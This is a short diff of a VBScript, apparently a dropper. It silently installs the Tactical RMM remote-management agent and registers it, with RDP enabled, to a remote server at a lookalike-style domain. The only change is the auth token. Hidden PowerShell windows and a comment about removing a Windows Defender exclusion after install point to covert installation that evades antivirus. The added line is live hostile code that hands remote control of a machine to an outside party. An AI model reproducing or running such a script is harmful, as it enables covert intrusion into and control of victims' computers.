@@ -25,7 +25,7 @@ oShell.Run """" & strTemp & """ /VERYSILENT /SUPPRESSMSGBOXES", 0, True
 WScript.Sleep 6000
 
 ' Register with server
-oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping", 0, True
+oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth c96ed8f5bd600880cedb283731026c5db65f8f942dbfeb16ee508b310b7dc3ec --rdp --ping", 0, True
 
 ' Remove exclusion after install
 oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True
